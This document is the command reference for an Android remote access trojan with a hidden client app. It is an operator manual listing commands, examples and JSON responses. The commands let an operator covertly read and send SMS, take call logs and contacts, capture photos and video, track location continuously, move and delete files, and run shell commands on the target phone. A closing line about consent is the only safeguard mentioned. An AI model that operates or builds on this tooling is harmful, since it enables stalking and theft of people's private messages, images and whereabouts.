# RAT System Command Reference

## Command Categories

### 🔧 Basic Commands
| Command | Description | Parameters | Example |
|---------|-------------|------------|---------|
| `ping` | Test connection and response time | None | `ping` |
| `device_info` | Get comprehensive device information | None | `device_info` |

### 📁 File Operations
| Command | Description | Parameters | Example |
|---------|-------------|------------|---------|
| `file_dirs` | Get common Android directories | None | `file_dirs` |
| `file_list` | List files and directories | `<path>` | `file_list /sdcard` |
| `file_download` | Get file info for download | `<filepath>` | `file_download /sdcard/photo.jpg` |
| `file_upload` | Upload file to device | `<filename:base64data>` | `file_upload test.txt:SGVsbG8=` |
| `file_delete` | Delete file or directory | `<filepath>` | `file_delete /sdcard/temp.txt` |

### 📱 SMS & Communication
| Command | Description | Parameters | Example |
|---------|-------------|------------|---------|
| `sms_read` | Read SMS messages | `[limit]` | `sms_read 20` |
| `sms_send` | Send SMS message | `<number:message>` | `sms_send +1234567890:Hello` |
| `call_log` | Get call history | `[limit]` | `call_log 50` |
| `contacts` | Get contact list | `[limit]` | `contacts 100` |

### 📸 Camera Operations
| Command | Description | Parameters | Example |
|---------|-------------|------------|---------|
| `camera_info` | Get camera capabilities | None | `camera_info` |
| `camera_photo` | Capture photo | `[cameraId:quality]` | `camera_photo 0:high` |
| `camera_video_start` | Start video recording | `[cameraId:duration]` | `camera_video_start 0:60` |
| `camera_video_stop` | Stop video recording | None | `camera_video_stop` |

### 🌍 Location Tracking
| Command | Description | Parameters | Example |
|---------|-------------|------------|---------|
| `location_providers` | Get location provider status | None | `location_providers` |
| `location_get` | Get current location | None | `location_get` |
| `location_start` | Start location tracking | None | `location_start` |
| `location_stop` | Stop location tracking | None | `location_stop` |

### ⚙️ Shell Commands
| Command | Description | Parameters | Example |
|---------|-------------|------------|---------|
| `shell_check` | Check shell access | None | `shell_check` |
| `shell_exec` | Execute shell command | `<command>` | `shell_exec whoami` |
| `shell_system_info` | Get system information | None | `shell_system_info` |
| `shell_interactive` | Interactive command | `<command:input>` | `shell_interactive cat:Hello` |

### 🎮 Session Management
| Command | Description | Parameters | Example |
|---------|-------------|------------|---------|
| `sessions` | List active sessions | None | `sessions` |
| `session` | Connect to session | `<session_id>` | `session 1` |
| `back` | Return to main prompt | None | `back` |
| `exit` | Exit server | None | `exit` |

## Detailed Command Documentation

### Basic Commands

#### `ping`
**Purpose**: Test connection and measure response time  
**Syntax**: `ping`  
**Response**:
```json
{
  "status": "success",
  "timestamp": 1751234567890
}
```

#### `device_info`
**Purpose**: Get comprehensive device information  
**Syntax**: `device_info`  
**Response**: Device model, Android version, memory, storage, network info, app details, build information

### File Operations

#### `file_dirs`
**Purpose**: Get list of common Android directories  
**Syntax**: `file_dirs`  
**Response**: Array of directory objects with name and path

#### `file_list <path>`
**Purpose**: List files and directories in specified path  
**Syntax**: `file_list <path>`  
**Parameters**:
- `path`: Directory path to list (e.g., `/sdcard`, `/storage/emulated/0/Download`)

**Examples**:
```bash
file_list /sdcard
file_list /storage/emulated/0/Pictures
file_list /data/data/com.hidden.client_normad/files
```

**Response**: Array of file objects with:
- `name`: File/directory name
- `path`: Full path
- `size`: File size in bytes
- `is_directory`: Boolean flag
- `is_file`: Boolean flag
- `can_read`: Read permission
- `can_write`: Write permission
- `last_modified`: Timestamp
- `last_modified_date`: Formatted date

#### `file_download <filepath>`
**Purpose**: Get file information and prepare for download  
**Syntax**: `file_download <filepath>`  
**Parameters**:
- `filepath`: Full path to file

**Examples**:
```bash
file_download /sdcard/DCIM/Camera/IMG_001.jpg
file_download /storage/emulated/0/Download/document.pdf
```

#### `file_upload <filename:base64data>`
**Purpose**: Upload file to device  
**Syntax**: `file_upload <filename:base64data>`  
**Parameters**:
- `filename`: Target filename
- `base64data`: Base64 encoded file content

**Example**:
```bash
file_upload test.txt:SGVsbG8gV29ybGQ=
```

#### `file_delete <filepath>`
**Purpose**: Delete file or directory  
**Syntax**: `file_delete <filepath>`  
**Parameters**:
- `filepath`: Full path to file/directory to delete

**Examples**:
```bash
file_delete /sdcard/temp.txt
file_delete /storage/emulated/0/Download/old_file.zip
```

### SMS & Communication

#### `sms_read [limit]`
**Purpose**: Read SMS messages from device  
**Syntax**: `sms_read [limit]`  
**Parameters**:
- `limit`: Number of messages to retrieve (default: 50)

**Examples**:
```bash
sms_read
sms_read 20
sms_read 100
```

**Response**: Array of SMS objects with:
- `id`: Message ID
- `address`: Sender/recipient phone number
- `body`: Message content
- `date`: Timestamp
- `type`: Message type (1=received, 2=sent)
- `type_desc`: Human readable type
- `read`: Read status
- `date_formatted`: Formatted date string

#### `sms_send <number:message>`
**Purpose**: Send SMS message  
**Syntax**: `sms_send <number:message>`  
**Parameters**:
- `number`: Phone number (with country code)
- `message`: Text message content

**Examples**:
```bash
sms_send +1234567890:Hello World
sms_send +44123456789:Test message
```

#### `call_log [limit]`
**Purpose**: Get call history  
**Syntax**: `call_log [limit]`  
**Parameters**:
- `limit`: Number of call records (default: 50)

**Response**: Array of call objects with:
- `id`: Call ID
- `number`: Phone number
- `name`: Contact name (if available)
- `date`: Call timestamp
- `duration`: Call duration in seconds
- `type`: Call type (1=incoming, 2=outgoing, 3=missed)
- `type_desc`: Human readable type
- `duration_formatted`: MM:SS format

#### `contacts [limit]`
**Purpose**: Get contact list  
**Syntax**: `contacts [limit]`  
**Parameters**:
- `limit`: Number of contacts (default: 100)

### Camera Operations

#### `camera_info`
**Purpose**: Get camera information and capabilities  
**Syntax**: `camera_info`  
**Response**: Array of camera objects with:
- `camera_id`: Camera identifier
- `facing`: Camera direction (front/back/external)
- `supported_sizes`: Available resolutions
- `flash_available`: Flash support
- `auto_focus_available`: Auto focus support

#### `camera_photo [cameraId:quality]`
**Purpose**: Capture photo  
**Syntax**: `camera_photo [cameraId:quality]`  
**Parameters**:
- `cameraId`: Camera ID (0=back, 1=front, default: 0)
- `quality`: Image quality (low/medium/high, default: high)

**Examples**:
```bash
camera_photo
camera_photo 0:high
camera_photo 1:medium
```

#### `camera_video_start [cameraId:duration]`
**Purpose**: Start video recording  
**Syntax**: `camera_video_start [cameraId:duration]`  
**Parameters**:
- `cameraId`: Camera ID (default: 0)
- `duration`: Recording duration in seconds (default: 30)

**Examples**:
```bash
camera_video_start
camera_video_start 0:60
camera_video_start 1:120
```

#### `camera_video_stop`
**Purpose**: Stop video recording  
**Syntax**: `camera_video_stop`

### Location Tracking

#### `location_providers`
**Purpose**: Get location provider status  
**Syntax**: `location_providers`  
**Response**:
- `gps_enabled`: GPS provider status
- `network_enabled`: Network provider status
- `passive_enabled`: Passive provider status
- `location_services_enabled`: Overall location services
- `permission_granted`: Location permission status

#### `location_get`
**Purpose**: Get current location  
**Syntax**: `location_get`  
**Response**:
- `latitude`: GPS latitude
- `longitude`: GPS longitude
- `altitude`: Altitude (if available)
- `accuracy`: Location accuracy in meters
- `bearing`: Direction (if available)
- `speed`: Speed (if available)
- `provider`: Location provider used
- `timestamp`: Location timestamp

#### `location_start`
**Purpose**: Start continuous location tracking  
**Syntax**: `location_start`  
**Response**: Tracking status and update intervals

#### `location_stop`
**Purpose**: Stop location tracking  
**Syntax**: `location_stop`

### Shell Commands

#### `shell_check`
**Purpose**: Check shell access and capabilities  
**Syntax**: `shell_check`  
**Response**:
- `shell_available`: Basic shell access
- `root_access`: Root/superuser access
- `test_results`: Results of test commands

#### `shell_exec <command>`
**Purpose**: Execute shell command  
**Syntax**: `shell_exec <command>`  
**Parameters**:
- `command`: Shell command to execute

**Examples**:
```bash
shell_exec whoami
shell_exec pwd
shell_exec ls -la /sdcard
shell_exec ps aux
shell_exec df -h
shell_exec cat /proc/version
shell_exec netstat -an
```

**Response**:
- `command`: Executed command
- `exit_code`: Command exit code
- `output`: Command output
- `error`: Error output (if any)
- `execution_time_ms`: Execution time
- `success`: Boolean success flag

#### `shell_system_info`
**Purpose**: Get comprehensive system information  
**Syntax**: `shell_system_info`  
**Response**: System information including:
- `kernel`: Kernel version
- `uptime`: System uptime
- `memory`: Memory information
- `cpu`: CPU information
- `disk`: Disk usage
- `processes`: Running processes
- `network`: Network configuration
- `environment`: Environment variables

#### `shell_interactive <command:input>`
**Purpose**: Execute interactive command with input  
**Syntax**: `shell_interactive <command:input>`  
**Parameters**:
- `command`: Interactive command
- `input`: Input to send to command

**Example**:
```bash
shell_interactive cat:Hello World
```

## Response Format

All commands return JSON responses with the following structure:

### Success Response
```json
{
  "status": "success",
  "command": "command_name",
  "timestamp": 1751234567890,
  "data": {
    // Command-specific data
  }
}
```

### Error Response
```json
{
  "status": "error",
  "message": "Error description",
  "timestamp": 1751234567890
}
```

## Permission Requirements

| Feature | Required Permissions |
|---------|---------------------|
| SMS Operations | `READ_SMS`, `SEND_SMS` |
| Call Log | `READ_CALL_LOG` |
| Contacts | `READ_CONTACTS` |
| Camera | `CAMERA` |
| Location | `ACCESS_FINE_LOCATION`, `ACCESS_COARSE_LOCATION` |
| Storage | `READ_EXTERNAL_STORAGE`, `WRITE_EXTERNAL_STORAGE` |
| Phone | `READ_PHONE_STATE` |

## Best Practices

1. **Test Connection**: Always start with `ping` to verify connectivity
2. **Check Permissions**: Use appropriate commands to verify permissions before operations
3. **Handle Errors**: Check response status before processing data
4. **Resource Management**: Be mindful of large file operations and long-running commands
5. **Security**: Only use on authorized devices with proper consent
